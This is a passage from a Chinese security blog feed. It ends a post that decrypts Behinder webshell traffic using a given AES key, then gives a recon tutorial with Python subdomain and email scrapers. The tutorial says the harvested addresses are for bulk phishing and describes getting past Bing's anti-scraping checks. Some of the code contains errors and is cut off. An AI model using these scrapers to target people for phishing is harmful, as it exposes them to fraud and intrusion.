class=\"line\">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</span><br><span class=\"line\">Mozilla/5.0 (Windows; U; Windows NT 6.1; ) AppleWebKit/534.12 (KHTML, like Gecko) Maxthon/3.0 Safari/534.12</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)</span><br><span class=\"line\">Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.33 Safari/534.3 SE 2.X MetaSr 1.0</span><br><span class=\"line\">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)</span><br><span class=\"line\">Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/144 255 173)&quot;&gt;13.0.782.41 Safari/535.1 QQBrowser/6.9.144 255 173)&quot;&gt;11079.201</span><br><span class=\"line\">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E) QQBrowser/6.9.144 255 173)&quot;&gt;11079.201</span><br><span class=\"line\">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)</span><br></pre></td></tr></table></figure>\n<ol>\n<li>长连接<br>\n冰蝎默认使用的是长连接，因此能看到</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MiLBm3HewNzi6SZ6.png!thumbnail\" alt=\"\"></p>\n<p>Connection 为 keep-alive</p>\n<ol>\n<li>Accept<br>\n 冰蝎的 Accept 字段很特殊，如图所示的请求体 Accept 字段</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6Rfq52djVgr0tpjs.png!thumbnail\" alt=\"\"></p>\n<p>可以在这里调整是查看请求包还是回应包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6S3tFiquxDFzKkaC.png!thumbnail\" alt=\"\"></p>\n<p>接下来先将请求的加密字段拿去解密</p>\n<p>这里附上我使用的 aes 解密和 base64 解密网址：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGUteC5jbi9jcnlwdG9ncmFwaHkvQWVzLmFzcHg=\">https://the-x.cn/cryptography/Aes.aspx</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYubXp5MC5jb20vQ3liZXJDaGVmMy8=\">https://ctf.mzy0.com/CyberChef3/</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aQgCMfOWwhWkM9j5.png!thumbnail\" alt=\"\"></p>\n<p>这里说明一下，在解密时需要将 aes 的加密模式调整为 CBC</p>\n<p>key 为上传的 shell.php 中的 16 位加密的密钥即 e45e329feb5d925b</p>\n<p>而偏移量默认为 0123456789abcdef</p>\n<p>可以看到的是有一个 decode 标识着括号里的 base64 码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pGTGwJsgs1qeMbL1.png!thumbnail\" alt=\"\"></p>\n<p>将 base64 复制下来放入网站中成功解密，而输出的这段代码便是冰蝎对我们命令执行时的加密代码，也同时可以在底部查看到我们输入的命令</p>\n<p>追踪流 23：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9ofiyS7wJA73jR6v.png!thumbnail\" alt=\"\"></p>\n<p>继续这样去找，能够找到我们之前输入的三个命令</p>\n<p>追踪流 29：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5PaASe86v1dEeqz4.png!thumbnail\" alt=\"\"></p>\n<p>追踪流 34：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xLBjKqlvupY4LhSu.png!thumbnail\" alt=\"\"></p>\n<p>接下来切换一下左下角的选项，查看回应包</p>\n<p>追踪流 23：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4jmut6UKg3yewmBU.png!thumbnail\" alt=\"\"></p>\n<p>一样进行 AES 解密 -&gt;base64 解密</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZeLLHx28qrcMBUKr.png!thumbnail\" alt=\"\"></p>\n<p>将后面这段复制出来进行 base64 解密</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WT5iDXH8RF4wdb1r.png!thumbnail\" alt=\"\"></p>\n<p>能发现成功和我们之前执行命令时的回显对上了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1jEMDZtPmWalFSVV.png!thumbnail\" alt=\"\"></p>\n<p>接下来的两个也都是一样</p>\n<p>追踪流 29：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LPVSKZHY9omPgvQI.png!thumbnail\" alt=\"\"></p>\n<p>由于流 29 执行的命令是 ls<br>\n/tmp，而 tmp 目录下没有东西，回显也能看到，因此解密出来为空</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bofnsQu1ctbjzk4z.png!thumbnail\" alt=\"\"></p>\n<p>追踪流 34：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EKk6b3I5Je4ZlU9Z.png!thumbnail\" alt=\"\"></p>\n<p>也是成功和回显对上了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9fsjWNUUeyEMOWkg.png!thumbnail\" alt=\"\"></p>\n<p>回到开头所讲述的冰蝎 3.0 版本没有了动态密钥的获取，因此只有攻击者能够知道密钥是什么，而 2.0 的密钥是能够通过流量进行抓取的（抓取的是加密之后的密钥），相当于是密钥随身跟随，另外冰蝎还有许多的功能之后再慢慢研究</p>\n<p>本片文章是个人的一些看法，还望师傅们多多提建议</p>\n<blockquote>\n<p>PS：最近开放了，还望师傅们多注意身体，别像我一样🐏了个🐏</p>\n</blockquote>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "https://nnnpc.github.io/2024/04/16/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "被动信息收集",
            "date_published": "2024-04-16T05:58:19.043Z",
            "content_html": "<p>信息收集通常可以分为<strong>被动信息收集</strong>和 ** 主动信息收集，** 被动信息收集是指不与目标主机进行直接交互，通常根据搜索引擎或者社交等方式间接获取目标主机的信息；主动信息收集是指与目标主机进行直接交互，从而获取所需要的目标信息</p>\n<p>攻击者比较关注目标主机的所有信息，比如：子域名、IP 地址、旁站、C 段查询、用户邮箱 CMS 类型、敏感目录、端口信息、服务器版本以及中间件等</p>\n<p>被动信息收集主要是通过一些收集引擎例如 fofa、鹰图等等进行收集、或者通过一些社交方式来获得一些信息。该方法是不与目标机子产生交互的，可以不接触目标的情况下挖掘目标信息。主要方法包括：DNS 解析、子域名挖掘、邮件爬取等等</p>\n<p><strong>DNS 解析</strong></p>\n<p>DNS 是一种分布式网络目录服务，主要用于域名与 ip 地址的相互转换，能够使用户更方便地访问互联网，TCP/IP 中的 IP 地址是由四段以 &quot;.&quot; 分开地数字组成，记起来总是不如名字那么方便，所以采用了域名系统来管理名字和 IP 地对应关系</p>\n<p><strong>IP 查询</strong></p>\n<p>IP 查询是通过当前所获取到的 URL 去查询对应 IP 地址的过程。可以应用 Socket 库函数中的 gethostbyname () 获取域名所对应的 IP 值</p>\n<p>例：查询域名<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmFpZHUueG4tLWNvbS1scTBmMzhpZDlneG01Yg==\"> www.baidu.com</span> 所对应的 IP 值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import socket</span><br><span class=\"line\">ip = socket.gethostbyname(&#x27;www.baidu.com&#x27;)</span><br><span class=\"line\">print(ip)</span><br></pre></td></tr></table></figure>\n<p>输出结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">112.80.248.75</span><br></pre></td></tr></table></figure>\n<p><strong>Whois 查询</strong></p>\n<p>Whois 是用来查询域名的 IP 以及所有者信息的传输协议。简单地说，Whois 就是一个数据库，用来查询域名是否已经被注册，以及注册域名的详细信息（如域 - 名所有人、域名注册商等）。Python 中的 python-whois 模块可以用于 Whois 的查询</p>\n<p>先通过 pip 安装 python-whois 模块：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install python-whois·</span><br></pre></td></tr></table></figure>\n<p>通过自带的 whois 模块查询域名<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmFpZHUuY29t\"> www.baidu.com</span><br>\n 的注册信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from whois import whois</span><br><span class=\"line\">data = whois(&#x27;www.baidu.com&#x27;)</span><br><span class=\"line\">print(data)</span><br></pre></td></tr></table></figure>\n<p>输出结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;domain_name&quot;: [</span><br><span class=\"line\">    &quot;BAIDU.COM&quot;,</span><br><span class=\"line\">    &quot;baidu.com&quot;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  &quot;registrar&quot;: &quot;MarkMonitor, Inc.&quot;,</span><br><span class=\"line\">  &quot;whois_server&quot;: &quot;whois.markmonitor.com&quot;,</span><br><span class=\"line\">  &quot;referral_url&quot;: null,</span><br><span class=\"line\">  &quot;updated_date&quot;: [</span><br><span class=\"line\">    &quot;2022-09-01 03:54:43&quot;,</span><br><span class=\"line\">    &quot;2022-09-01 03:29:31&quot;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  &quot;creation_date&quot;: &quot;1999-10-11 11:05:17&quot;,</span><br><span class=\"line\">  &quot;expiration_date&quot;: [</span><br><span class=\"line\">    &quot;2026-10-11 11:05:17&quot;,</span><br><span class=\"line\">    &quot;2026-10-11 07:00:00&quot;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  &quot;name_servers&quot;: [</span><br><span class=\"line\">    &quot;NS1.BAIDU.COM&quot;,</span><br><span class=\"line\">    &quot;NS2.BAIDU.COM&quot;,</span><br><span class=\"line\">    &quot;NS3.BAIDU.COM&quot;,</span><br><span class=\"line\">    &quot;NS4.BAIDU.COM&quot;,</span><br><span class=\"line\">    &quot;NS7.BAIDU.COM&quot;,</span><br><span class=\"line\">    &quot;ns7.baidu.com&quot;,</span><br><span class=\"line\">    &quot;ns4.baidu.com&quot;,</span><br><span class=\"line\">    &quot;ns1.baidu.com&quot;,</span><br><span class=\"line\">    &quot;ns2.baidu.com&quot;,</span><br><span class=\"line\">    &quot;ns3.baidu.com&quot;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  &quot;status&quot;: [</span><br><span class=\"line\">    &quot;clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited&quot;,</span><br><span class=\"line\">    &quot;clientTransferProhibited https://icann.org/epp#clientTransferProhibited&quot;,</span><br><span class=\"line\">    &quot;clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited&quot;,</span><br><span class=\"line\">    &quot;serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited&quot;,</span><br><span class=\"line\">    &quot;serverTransferProhibited https://icann.org/epp#serverTransferProhibited&quot;,</span><br><span class=\"line\">    &quot;serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited&quot;,</span><br><span class=\"line\">    &quot;clientUpdateProhibited (https://www.icann.org/epp#clientUpdateProhibited)&quot;,</span><br><span class=\"line\">    &quot;clientTransferProhibited (https://www.icann.org/epp#clientTransferProhibited)&quot;,</span><br><span class=\"line\">    &quot;clientDeleteProhibited (https://www.icann.org/epp#clientDeleteProhibited)&quot;,</span><br><span class=\"line\">    &quot;serverUpdateProhibited (https://www.icann.org/epp#serverUpdateProhibited)&quot;,</span><br><span class=\"line\">    &quot;serverTransferProhibited (https://www.icann.org/epp#serverTransferProhibited)&quot;,</span><br><span class=\"line\">    &quot;serverDeleteProhibited (https://www.icann.org/epp#serverDeleteProhibited)&quot;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  &quot;emails&quot;: [</span><br><span class=\"line\">    &quot;abusecomplaints@markmonitor.com&quot;,</span><br><span class=\"line\">    &quot;whoisrequest@markmonitor.com&quot;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  &quot;dnssec&quot;: &quot;unsigned&quot;,</span><br><span class=\"line\">  &quot;name&quot;: null,</span><br><span class=\"line\">  &quot;org&quot;: &quot;Beijing Baidu Netcom Science Technology Co., Ltd.&quot;,</span><br><span class=\"line\">  &quot;address&quot;: null,</span><br><span class=\"line\">  &quot;city&quot;: null,</span><br><span class=\"line\">  &quot;state&quot;: &quot;Beijing&quot;,</span><br><span class=\"line\">  &quot;registrant_postal_code&quot;: null,</span><br><span class=\"line\">  &quot;country&quot;: &quot;CN&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>子域名挖掘</strong></p>\n<p>域名可以分为顶级域名、一级域名、二级域名。子域名是顶级域名（一级域名或父域名）的下一级，例如 mail.example.com 和 calendar.example.com 是 example.com 的两个子域而 example.com 则是顶级域.com 的子域。在测试过程中，测试目标主站时如果未发现任何相关漏洞，此时通常会考虑挖掘目标系统的子域名。子域名的挖掘方式有很多种，例如：搜索引擎、子域名破解、字典查询等等</p>\n<p>这里用 python 写一个子域名的挖掘工具（通过 Bing 搜索引擎进行子域名搜集）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#! /usr/bin/env python</span><br><span class=\"line\"># _*_ coding:utf-8_*_</span><br><span class=\"line\">import requests</span><br><span class=\"line\">from bs4 import BeautifulSoup</span><br><span class=\"line\">from urllib.parse import urlparse</span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">def bing_search(site,pages):</span><br><span class=\"line\">    Sudbomain = []</span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:68.0)Gecko/20100101 Firefox/68.0&#x27;</span><br><span class=\"line\">        &#x27;Accept&#x27;:&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span><br><span class=\"line\">        &#x27;Referer&#x27;:&quot;https://cn.bing.com&quot;,</span><br><span class=\"line\">        &#x27;Cookie&#x27;:&quot;MUID=3B16E5B***********782&amp;t=6&quot; #填写相应的Cookie值</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    for i in range(1,int(pages)+1):</span><br><span class=\"line\">        url = &quot;https://cn.bing.com/search?q=site%3a&quot;+site+&quot;&amp;go=Search&amp;ds&amp;first=&quot;+ str((int(i)-1)*10) +&quot;&amp;FROM=PERE&quot;</span><br><span class=\"line\">        html = requests.get(url,headers=headers)</span><br><span class=\"line\">        soup = BeautifulSoup(html.content,&#x27;html.parser&#x27;)</span><br><span class=\"line\">        job_bt = soup.findAll(&#x27;h2&#x27;)</span><br><span class=\"line\">        for i in job_bt:</span><br><span class=\"line\">            link = i.a.get(&#x27;href&#x27;)</span><br><span class=\"line\">            domain = str(urlparse(link).scheme + &quot;://&quot; + urlparse(link).netloc)</span><br><span class=\"line\">            if domain in Subdomain:</span><br><span class=\"line\">                pass</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                Subdomain.append(domain)</span><br><span class=\"line\">                print(domain)</span><br><span class=\"line\">if __name__ == &#x27;_main_&#x27;:</span><br><span class=\"line\">    if len(sys.argv) == 3:</span><br><span class=\"line\">        site = sys.argv[1]</span><br><span class=\"line\">        page = sys.argv[2]</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&quot;usage: %s baidu.com 10&quot;% sys.argv[0]) #输出帮助信息</span><br><span class=\"line\">        sys.exit(-1)</span><br><span class=\"line\">    Subdomain = bing_search(site,page)</span><br></pre></td></tr></table></figure>\n<p><strong>邮件爬取</strong></p>\n<blockquote>\n<p>在针对目标系统进行渗透的过程中，如果目标服务器安全性很高，通过服务器很难获取目标权限时，通常会采用社工的方式对目标服务进行进一步的攻击。邮件钓鱼攻击是常见的攻击方式之一。在进行钓鱼之前，需要针对目标相关人员的邮件信息进行全面采集。<br>\n此处邮件采集工具主要通过国内常见的搜索引擎（百度、Bing 等进行搜集）。针对搜索界面的相关邮件信息进行爬取、处理等操作之后。利用获得的邮箱账号批量发送钓鱼邮件，等待目标用户或者管理员点击之后执行，进而获得目标的权限<br>\n邮件采集工具所用到的库如下所示</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import sys</span><br><span class=\"line\">import getopt</span><br><span class=\"line\">import request</span><br><span class=\"line\">from bs4 import BeautifulSoup</span><br><span class=\"line\">import re</span><br></pre></td></tr></table></figure>\n<p>在程序的起始部分，在执行过程中没有发生异常时，则执行定义的 start () 函数。通过 sys.argv [] 实现外部指令的接受。其中，sys.argv [0] 表示代码本身的文件路径，sys.argv [1:] 表示从第一个命令行参数到输入的最后一个命令行参数，存储形式为 list 类型：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;</span><br><span class=\"line\">    #定义异常</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        start(sys.argv[1:])</span><br><span class=\"line\">    except KeyboardInterrupt:</span><br><span class=\"line\">        print(&quot;interrupted by user, killing all threads...&quot;)</span><br></pre></td></tr></table></figure>\n<p>编写命令行参数处理功能。此处主要应用 getopt.getopt () 函数处理命令行参数，该函数目前有短选项和长选项两种格式。短选项格式为 &quot;-“加上单个字母选项；长选项格式为”–“加上一个单词选项。opts 为一个两元组列表，每个元素形式为”(选项串，附加参数)&quot;。当没有附加参数时，则为空串。之后通过 for 语句循环输出 opts 列表中的数值并赋值给自定义变量：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def start(argv):</span><br><span class=\"line\">    url = &quot; &quot;</span><br><span class=\"line\">    pages = &quot; &quot;</span><br><span class=\"line\">    if len(sys.argv) &lt; 2:</span><br><span class=\"line\">        print(&quot;-h 帮助信息 ;\\n&quot;)</span><br><span class=\"line\">        sys.exit()</span><br><span class=\"line\">    #定义异常处理</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        bannner()</span><br><span class=\"line\">        opts,args = getopt.getopt(argv,&quot;-u;-p;-h&quot;)</span><br><span class=\"line\">    except getopt.GetoptError:</span><br><span class=\"line\">        print(&#x27;Error an argument!&#x27;)</span><br><span class=\"line\">        sys.exit()</span><br><span class=\"line\">    for opt,arg in opts:</span><br><span class=\"line\">        if opt == &quot;-u&quot;:</span><br><span class=\"line\">            url = args</span><br><span class=\"line\">        elif opt == &quot;-p&quot;:</span><br><span class=\"line\">            pages = arg</span><br><span class=\"line\">        elif opt == &quot;-h&quot;:</span><br><span class=\"line\">            print(usage())</span><br><span class=\"line\">    launcher(url,pages)</span><br></pre></td></tr></table></figure>\n<p>输出帮助信息，增加代码工具的可读性和易用性。为了使输出信息更加美观简洁，可以通过转译字符设置输出字体颜色，从而实现需要的效果，开头部分包含三个参数：显示方式、前景色、背景色。这三个参数是可选的，可以只写其中的某一参数。结尾部分可以省略，但是为了书写规范，建议以 &quot;\\033 [0m&quot; 结尾</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">开头：\\033[显示方式;前景色;背景色m]</span><br><span class=\"line\">结尾部分：\\033[0m</span><br></pre></td></tr></table></figure>\n<p>示例代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(&#x27;\\033[0;30;41m 你好 \\033[0m&#x27;)</span><br><span class=\"line\">print(&#x27;\\033[0;30;47m 你好 \\033[0m&#x27;)</span><br></pre></td></tr></table></figure>\n<p>输出显示：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6LLEP3RsCoh5eujI.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/amEWiG135rsDgVAA.png!thumbnail\" alt=\"\"></p>\n<p>先以图案形式输出脚本出自 MS08067 实验室，然后输出有关脚本使用的帮助信息，即可执行参数执行以及对应的功能简介</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#banner信息</span><br><span class=\"line\">def banner():</span><br><span class=\"line\">    print(&#x27;\\033[1;34m###############################################################################################\\033[0m\\n&#x27;&#x27;\\033[1;34m#############################################\\033[1;32mMS08067实验室\\033[1;34m#############################################\\033[0m\\n&#x27;&#x27;\\033[1;34m##########################################################################################################\\033[0m\\n&#x27;)</span><br><span class=\"line\">#使用规则</span><br><span class=\"line\">def usage():</span><br><span class=\"line\">    print(&#x27;-h: --help 帮助;&#x27;)</span><br><span class=\"line\">    print(&#x27;-u: --url 域名;&#x27;)</span><br><span class=\"line\">    print(&#x27;-p: --pages 页数;&#x27;)</span><br><span class=\"line\">    print(&#x27;eg:python -u &quot;www.baidu.com&quot; -p 100&#x27;+&#x27;\\n&#x27;)</span><br><span class=\"line\">    sys.exit()</span><br></pre></td></tr></table></figure>\n<p>同时也可以根据自己的喜好设置输出不同类型的字体颜色或者图案<br>\n确定搜索邮件的关键字，并调用 bing_search () 和 baidu_search () 两个函数，返回 Bing 与百度两大搜索引擎的查询结果，由获取到的结果进行列表合并，去重之后循环输出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#漏洞回调函数</span><br><span class=\"line\">def launcher(url,pages):</span><br><span class=\"line\">    email_num = []</span><br><span class=\"line\">    key_words = [&#x27;email&#x27;,&#x27;mail&#x27;,&#x27;mailbox&#x27;,&#x27;邮件&#x27;,&#x27;邮箱&#x27;,&#x27;postbox&#x27;]</span><br><span class=\"line\">    for page in range(1,int(pages)+1):</span><br><span class=\"line\">        for key_word in key_words:</span><br><span class=\"line\">            bing_emails = bing_search(url,page,key_word)</span><br><span class=\"line\">            baidu_emails = baidu_search(url,page,key_word)</span><br><span class=\"line\">            sum_emails = bing_emails + baidu_emails</span><br><span class=\"line\">            for email in sum_emails:</span><br><span class=\"line\">                if email in email_num:</span><br><span class=\"line\">                    pass</span><br><span class=\"line\">                else:</span><br><span class=\"line\">                    print(email)</span><br><span class=\"line\">                    with open(&#x27;data.txt&#x27;,&#x27;a+&#x27;) as f:</span><br><span class=\"line\">                        f.write(email + &#x27;\\n&#x27;)</span><br><span class=\"line\">                    email_num.append(email)</span><br></pre></td></tr></table></figure>\n<p>用 Bing 搜索引擎进行邮件爬取。Bing 引擎具有反爬系统，会通过限定 referer、cookie 等信息来确定是否是网页爬取操作。可以通过指定 referer 与 request.session () 函数自动获取 cookie 信息，绕过 Bing 搜索引擎的防爬防护</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def bing_search(url,page,key_word):</span><br><span class=\"line\">    referer = 